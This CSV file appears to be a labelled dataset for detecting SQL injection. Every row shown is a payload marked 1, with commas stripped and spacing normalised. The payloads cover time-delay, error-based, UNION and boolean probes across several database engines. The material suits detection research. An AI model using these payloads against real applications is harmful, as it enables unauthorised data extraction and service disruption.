Sentence,Label
1' or   (  select 9173 from  (  select count  (  *  )  concat  (  0x7171706a71  (  select   (  elt  (  9173  =  91731   )    )     )  0x717a767a71floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ,1
"select count  (  *  )   from all_users t1all_users t2all_users t3all_users t4all_users t5 and ""mpxd"" like ""mpxd",1
"1%"" and 2805  =  1345",1
1'   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  null  )  0  )  500000000  )  null  )   and    (    (     (  'zglq'  =  'zglq,1
"1""  )   and elt  (  3114  =  3114sleep  (  5   )    )   #",1
"1""  )   as pwvu where 8267  =  8267",1
1%'  )   waitfor delay '0:0:5'--,1
1 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  null  )  0  )  500000000  )  null  )  --,1
  (  select   (  case when   (  4232  =  4232  )   then   (  select benchmark  (  5000000md5  (  0x6b637544   )    )     )   else 4232*  (  select 4232 from mysql.db  )   end   )    )   ,1
"-7939""  )   or 3958  =  6909",1
1%'   )    )     )   union all select nullnullnull--,1
1'   )    )     )   rlike sleep  (  5  )   and    (    (     (  'zwyx'  =  'zwyx,1
-3136%'  )   or 3400  =  6002,1
"1""  )   as zjwu where 9963  =  9963 or 8514  =  benchmark  (  5000000md5  (  0x544d5a4c   )    )   #",1
1'   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   'krvo' like 'krvo,1
1'||  (  select 'tjzy' where 3037  =  3037,1
1'+  (  select 'vkis' where 3712  =  3712   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  0  )  500000000  )  null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users   )    )   +',1
1'  )   as fyib where 9246  =  9246,1
1 and 2620  =  2175,1
1'   )    )     )   waitfor delay '0:0:5' and    (    (     (  'clcf'  =  'clcf,1
1'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1
"1""  )   where 7228  =  7228",1
1'||  (  select 'qdkb' where 4331  =  4331,1
1'||  (  select 'kyhs' from dual where 9491  =  9491,1
"1""  )   union all select nullnullnull#",1
1   )    )    as zykv where 2158  =  2158,1
-2006'   )    )    union all select 78527852785278527852--,1
-2948'   )    )    or make_set  (  9354  =  93547185  )   and    (    (   'ivwt'  =  'ivwt,1
1  )   as zelk where 1944  =  1944 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  null  )  0  )  500000000  )  null  )  --,1
"1%""   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""%""  =  """,1
1   )    )    as fqee where 3286  =  3286,1
"1""  )   where 7452  =  7452",1
-5008' union all select 19421942194219421942194219421942--,1
1'   )    )    or 8466  =  benchmark  (  5000000md5  (  0x694a4745   )    )    and    (    (   'ltym'  =  'ltym,1
1'   )    )    union all select nullnullnullnullnullnull#,1
"1""  )   as ffon where 2738  =  2738 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",1
select * from generate_series  (  90589058case when   (  9058  =  1183  )   then 1 else 0 end  )   limit 1--,1
1'  )   as yjdg where 5262  =  5262 union all select nullnullnull#,1
"-2860""   )    )    order by 1#",1
elt  (  2427  =  24275518  )  ,1
1 or   (  select 9173 from  (  select count  (  *  )  concat  (  0x7171706a71  (  select   (  elt  (  9173  =  91731   )    )     )  0x717a767a71floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  -- ivku,1
1'  )   where 6274  =  6274 or 8156  =    (  select count  (  *  )   from generate_series  (  15000000   )    )   --,1
1'+  (  select 'asdq' where 4023  =  4023 and make_set  (  8403  =  84038899   )    )   +',1
1'   )    )    as fcjk where 7755  =  7755,1
-4896'  )   union all select 1929--,1
"1""   )    )    and 4595  =  4595#",1
-9582'  )   where 4397  =  4397 union all select 439743974397#,1
"-9110""   )    )    union all select 22632263226322632263#",1
"-8118""  )   where 3561  =  3561 or   (  8459  =  8459  )  *4906--",1
"1""  )   and elt  (  1210  =  1210sleep  (  5   )    )    and   (  ""zxks""  =  ""zxks",1
"1""   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  null  )  0  )  500000000  )  null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  ""kfdh"" like ""kfdh",1
"1""   )    )    or 8156  =    (  select count  (  *  )   from generate_series  (  15000000   )    )   --",1
"1""   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  5  )   and    (    (     (  ""rtzn""  =  ""rtzn",1
select count  (  *  )   from sysibm.systables as t1sysibm.systables as t2sysibm.systables as t3 and    (    (   'ootz' like 'ootz,1
1%'  )   or 1022  =    (  select count  (  *  )   from all_users t1all_users t2all_users t3all_users t4all_users t5  )  --,1
-8023' or 6872  =  6872,1
-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 31143114311431143114311431143114--,1
-9297  )   union all select 68416841684168416841--,1
"-4905"" union all select 60826082--",1
1' where 3760  =  3760 union all select nullnullnullnullnullnullnullnull#,1
1'  )   where 3311  =  3311,1
"1""   )    )    as tljw where 8474  =  8474 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --",1
"1""   )    )     )   and 2716  =    (  select count  (  *  )   from sysusers as sys1sysusers as sys2sysusers as sys3sysusers as sys4sysusers as sys5sysusers as sys6sysusers as sys7  )  --",1
1'+  (  select bgbq where 1589  =  1589 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   +',1
1' procedure analyse  (  extractvalue  (  5840concat  (  0x5c0x7171706a71  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   0x717a767a71   )    )   1  )  ,1
1  )   as keog where 8033  =  8033 and extractvalue  (  7982concat  (  0x5c0x7171706a71  (  select   (  elt  (  7982  =  79821   )    )     )  0x717a767a71   )    )   --,1
1'||  (  select 'ovlx' where 8767  =  8767 or sleep  (  5   )    )   ||',1
"select like  (  'abcdefg'upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""unju""  =  ""unju",1
1   )    )     )   and sleep  (  5  )  #,1
"-5761""  )   or 3762  =  1274",1
"1""   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""pyfz"" like ""pyfz",1
-8546' union all select 472947294729472947294729472947294729#,1
"1%""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""%""  =  """,1
"1""  )   where 6964  =  6964",1
1'  )   as wquy where 2518  =  2518,1
"1""   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  15000000   )    )    and    (    (   ""jydy"" like ""jydy",1
"1""  )   as gffq where 4387  =  4387 or extractvalue  (  1297concat  (  0x5c0x7171706a71  (  select   (  elt  (  1297  =  12971   )    )     )  0x717a767a71   )    )   --",1
select count  (  *  )   from rdb$fields as t1rdb$types as t2rdb$collations as t3rdb$functions as t4 and    (    (   'vjdk' like 'vjdk,1
1'+  (  select mhfn where 2425  =  2425,1
-9541 where 4291  =  4291 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1
"1""   )    )    union all select nullnullnullnull--",1
1' where 8231  =  8231,1
1 union all select nullnullnullnull--,1
1  )   as fxfe where 1148  =  1148 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1
"1""   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1sysusers as sys2sysusers as sys3sysusers as sys4sysusers as sys5sysusers as sys6sysusers as sys7  )   and    (    (   ""pmmr""  =  ""pmmr",1
1' in boolean mode  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  0  )  5000000000  )  null  )  #,1
1'   )    )    as qpai where 2619  =  2619,1
"1""   )    )     )   and updatexml  (  3393concat  (  0x2e0x7171706a71  (  select   (  elt  (  3393  =  33931   )    )     )  0x717a767a71  )  1161  )   and    (    (     (  ""eslj"" like ""eslj",1
"1""   )    )    as yutu where 1306  =  1306 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  5  )  --",1
1 where 5925  =  5925 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1sysibm.systables as t2sysibm.systables as t3  )  --,1
1%'  )   union all select nullnullnullnullnullnullnull#,1
1  )   or updatexml  (  1808concat  (  0x2e0x7171706a71  (  select   (  elt  (  1808  =  18081   )    )     )  0x717a767a71  )  8666  )   and   (  3294  =  3294,1
-9541  )   as bnky where 3934  =  3934 union all select 393439343934#,1
"1""  )   procedure analyse  (  extractvalue  (  9255concat  (  0x5c  (  benchmark  (  5000000md5  (  0x52515a50   )    )      )    )     )  1  )   and   (  ""stcv""  =  ""stcv",1
1'  )   as akvn where 8669  =  8669,1
1' and   (  select 9067 from  (  select count  (  *  )  concat  (  0x7171706a71  (  select   (  elt  (  9067  =  90671   )    )     )  0x717a767a71floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'ankn'  =  'ankn,1
"1""   )    )    as zemm where 3324  =  3324 or 2367  =    (  select count  (  *  )   from rdb$fields as t1rdb$types as t2rdb$collations as t3rdb$functions as t4  )  --",1
1   )    )     )   or   (  select 9173 from  (  select count  (  *  )  concat  (  0x7171706a71  (  select   (  elt  (  9173  =  91731   )    )     )  0x717a767a71floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  4924  =  4924,1
"-6267""   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""rqws""  =  ""rqws",1
-4351'  )   or 6525  =  9458,1
-6665'   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  'winx'  =  'winx,1
"1%"" and 3824  =  benchmark  (  5000000md5  (  0x76555642   )    )    and ""%""  =  """,1
1'||  (  select 'baur' from dual where 9384  =  9384 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  0  )  5000000000  )  null  )  --,1
iif  (  6307  =  245911/0  )  ,1
"1""   )    )    procedure analyse  (  extractvalue  (  9255concat  (  0x5c  (  benchmark  (  5000000md5  (  0x52515a50   )    )      )    )     )  1  )   and    (    (   ""hhwy""  =  ""hhwy",1
1'  )   procedure analyse  (  extractvalue  (  5840concat  (  0x5c0x7171706a71  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   0x717a767a71   )    )   1  )   and   (  'lkun' like 'lkun,1
1' and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and 'foju'  =  'foju,1
select count  (  *  )   from all_users t1all_users t2all_users t3all_users t4all_users t5 and   (  'oskf' like 'oskf,1
"1"" and make_set  (  8403  =  84038899  )   and ""bbgg""  =  ""bbgg",1
"1"" or elt  (  6272  =  6272sleep  (  5   )    )    and ""zzca""  =  ""zzca",1
1'   )    )     )   and 7401  =  9838#,1
1'   )    )    as vnwn where 8774  =  8774 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1
" end and    (    (   ""kvts"" like ""kvts",1
-6566'  )   as kggb where 9768  =  9768 order by 1--,1
1'+  (  select 'bztp' where 2541  =  2541 union all select nullnullnullnullnullnullnullnullnullnull--,1
"-5115"" union all select 16421642164216421642164216421642--",1
-6581'||  (  select 'hpjd' where 7608  =  7608 union all select 76087608760876087608760876087608#,1
"-2414%""  )   or elt  (  1032  =  10323623  )   and   (  ""%""  =  """,1
1'  )   where 3579  =  3579   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  0  )  500000000  )  null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --,1
1' or 7417  =    (  select count  (  *  )   from sysibm.systables as t1sysibm.systables as t2sysibm.systables as t3  )  --,1
1' where 8360  =  8360 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  5  )  --,1
"1%""   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (   ""%""  =  """,1
1'  )   as tqdg where 9355  =  9355,1
"-7388""  )   as rlth where 5746  =  5746 or 5023  =  ctxsys.drithsx.sn  (  5023  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
"1"" where 4991  =  4991 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  0  )  5000000000  )  null  )  --",1
-3518  )   union all select 1877187718771877#,1
1  )   where 5073  =  5073 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  null  )  0  )  500000000  )  null  )  --,1
"1""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1
"-4830""   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""dyut""  =  ""dyut",1
"1""  )   as fcrx where 2929  =  2929 and 2820  =  5133",1
"-8414%""  )   union all select 2795#",1
select sleep  (  5  )   and    (    (     (  'iwwa' like 'iwwa,1
1   )    )    and   (  3020  =  3020  )  *6703 and    (    (   3078  =  3078,1
1 and extractvalue  (  7982concat  (  0x5c0x7171706a71  (  select   (  elt  (  7982  =  79821   )    )     )  0x717a767a71   )    )   ,1
-9770'   )    )    as ovhh where 7903  =  7903 or 5023  =  ctxsys.drithsx.sn  (  5023  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1
1'||  (  select 'tcfy' where 4546  =  4546 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  ||',1
"-4580"" or 1570  =  convert  (  int  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""dbhb""  =  ""dbhb",1
1   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1
-8051  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  5637  =  5637,1
1' and   (  3435  =  7210  )  *7210 and 'lxxt'  =  'lxxt,1
"-3068%""   )    )    union all select 65976597659765976597659765976597--",1
"1""   )    )     )   and 3824  =  benchmark  (  5000000md5  (  0x76555642   )    )    and    (    (     (  ""pnsz"" like ""pnsz",1
"-2725"" union all select 36713671367136713671#",1
1'   )    )    as cyom where 2318  =  2318 and 7533  =  7533--,1
1 where 3956  =  3956,1
"1""  )   where 4971  =  4971 and 3824  =  benchmark  (  5000000md5  (  0x76555642   )    )   --",1
"-3205""  )   union all select 5233523352335233#",1
"1""  )   and 8677  =  9054#",1
"1""   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1sysibm.systables as t2sysibm.systables as t3  )   and    (    (   ""oyfz""  =  ""oyfz",1
"1""  )   where 5870  =  5870 union all select nullnullnull--",1
1 where 7158  =  7158 or elt  (  5873  =  5873sleep  (  5   )    )   #,1
1   )    )    and 4637  =  1408 and    (    (   6509  =  6509,1
"1""  )   where 2570  =  2570 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1sysibm.systables as t2sysibm.systables as t3  )  --",1
"select like  (  'abcdefg'upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""yxes"" like ""yxes",1
-4325' or make_set  (  9354  =  93547185  )  ,1
"1"" and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  null  )  0  )  500000000  )  null  )  --",1
1'   )    )     )   and extractvalue  (  7982concat  (  0x5c0x7171706a71  (  select   (  elt  (  7982  =  79821   )    )     )  0x717a767a71   )    )    and    (    (     (  'cfhi' like 'cfhi,1
1'   )    )    and 8635  =    (  select count  (  *  )   from generate_series  (  15000000   )    )   --,1
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  0  )  500000000  )  null  )   and    (    (     (  ""xxug""  =  ""xxug",1
"1"" order by 1#",1
"1""   )    )    as ycvh where 4523  =  4523 and sleep  (  5  )  #",1
1%'   )    )     )   and 9198  =  9198--,1
1'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   'zjun'  =  'zjun,1
1   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1
"1""  )   as dfmm where 7563  =  7563 or 8421  =    (  select count  (  *  )   from generate_series  (  15000000   )    )   --",1
1   )    )     )   or 6979  =  like  (  'abcdefg'upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --,1
"1%""   )    )     )   and 8438  =  7620--",1
1 and 7533  =  7533,1
1 or 8421  =    (  select count  (  *  )   from generate_series  (  15000000   )    )   ,1
1' where 6953  =  6953 or 2367  =    (  select count  (  *  )   from rdb$fields as t1rdb$types as t2rdb$collations as t3rdb$functions as t4  )  --,1
-5198   )    )     )   union all select 70897089708970897089708970897089#,1
"1""   )    )    as wugz where 5355  =  5355 and 3824  =  benchmark  (  5000000md5  (  0x76555642   )    )   --",1
1%'   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1rdb$types as t2rdb$collations as t3rdb$functions as t4  )  --,1
"1""  )   where 1144  =  1144 and 2006  =  2006",1
1%'  )   rlike sleep  (  5  )   and   (  '%'  =  ',1
1  )   where 7748  =  7748 and 9254  =    (  select count  (  *  )   from rdb$fields as t1rdb$types as t2rdb$collations as t3rdb$functions as t4  )  --,1
-9171  )   union all select 6880688068806880688068806880#,1
-1772' or 7911  =  4985#,1
1' and 6510  =    (  select count  (  *  )   from sysusers as sys1sysusers as sys2sysusers as sys3sysusers as sys4sysusers as sys5sysusers as sys6sysusers as sys7  )   and 'zjxk'  =  'zjxk,1
1'  )   where 9091  =  9091 union all select nullnullnullnull#,1
1' and   (  1088  =  7530  )  *7530 and 'xkfu'  =  'xkfu,1
1'  )   and 3202  =  like  (  'abcdefg'upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'cssb'  =  'cssb,1
1' and make_set  (  4952  =  71297129  )  ,1
1  )   and 3861  =  5813--,1
1  )   as afxc where 7497  =  7497,1
1' where 8537  =  8537 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1
-1711  )   where 9098  =  9098 order by 1#,1
1' in boolean mode  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   #,1
1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,1
1'  )   where 2928  =  2928 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1
1  )   as cnpv where 4902  =  4902 and elt  (  1210  =  1210sleep  (  5   )    )   --,1
-2582'+  (  select ggim where 5346  =  5346 union all select 53465346#,1
1   )    )    and 8148  =  like  (  'abcdefg'upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --,1
select count  (  *  )   from rdb$fields as t1rdb$types as t2rdb$collations as t3rdb$functions as t4 and   (  'crkz'  =  'crkz,1
1'   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  5  )  --,1
"-6381%"" or 8571  =  8571--",1
1'  )   as jlae where 1650  =  1650,1
1' where 2774  =  2774 union all select nullnullnullnullnull#,1
"1%""   )    )     (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  0  )  500000000  )  null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (   ""%""  =  """,1
1 where 7038  =  7038,1
1'+  (  select basp where 6953  =  6953,1
1' and 6510  =    (  select count  (  *  )   from sysusers as sys1sysusers as sys2sysusers as sys3sysusers as sys4sysusers as sys5sysusers as sys6sysusers as sys7  )   and 'eqle'  =  'eqle,1
-8486%'   )    )     )   or 8571  =  8571--,1
"-3393""   )    )    union all select 5954595459545954595459545954595459545954--",1
-6642'  )   where 3459  =  3459 union all select 345934593459345934593459345934593459#,1
1   )    )     )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  null  )  0  )  500000000  )  null  )  --,1
"-4300""  )   or 5023  =  ctxsys.drithsx.sn  (  5023  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""klbu""  =  ""klbu",1
"-3505""  )   where 2340  =  2340 or 9323  =  9323#",1
-1714' union all select 6687--,1
"1%""   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  5  )   and    (    (     (  ""%""  =  """,1
"1%"" or 4411  =    (  select count  (  *  )   from sysusers as sys1sysusers as sys2sysusers as sys3sysusers as sys4sysusers as sys5sysusers as sys6sysusers as sys7  )   and ""%""  =  """,1
1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  0  )  5000000000  )  null  )   and   (  '%'  =  ',1
-5424'   )    )    union all select 82318231823182318231823182318231#,1
1'   )    )    as qhpv where 7049  =  7049 and make_set  (  8403  =  84038899  )  --,1
1 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71  (  select   (  elt  (  3484  =  34841   )    )     )  0x717a767a710x78   )    )   s  )   8446744073709551610 8446744073709551610   )    )     )  ,1
"1%"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",1
1 or row  (  10457562  )  >  (  select count  (  *  )  concat  (  0x7171706a71  (  select   (  elt  (  1045  =  10451   )    )     )  0x717a767a71floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  ,1
1'  )   where 2808  =  2808,1
select count  (  *  )   from generate_series  (  15000000  )   and    (    (   'hxcq'  =  'hxcq,1
1   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   9452  =  9452,1
"1""  )   and sleep  (  5  )  #",1
1 where 5382  =  5382 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  0  )  5000000000  )  null  )  --,1
1'  )   as bvvl where 9818  =  9818 and   (  select 9067 from  (  select count  (  *  )  concat  (  0x7171706a71  (  select   (  elt  (  9067  =  90671   )    )     )  0x717a767a71floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --,1
1'+  (  select 'wsjk' where 3291  =  3291,1
-3750'+  (  select alpu where 3911  =  3911 order by 1--,1
"1""  )   as wehx where 5744  =  5744",1
-8580'  )   union all select 342834283428342834283428342834283428#,1
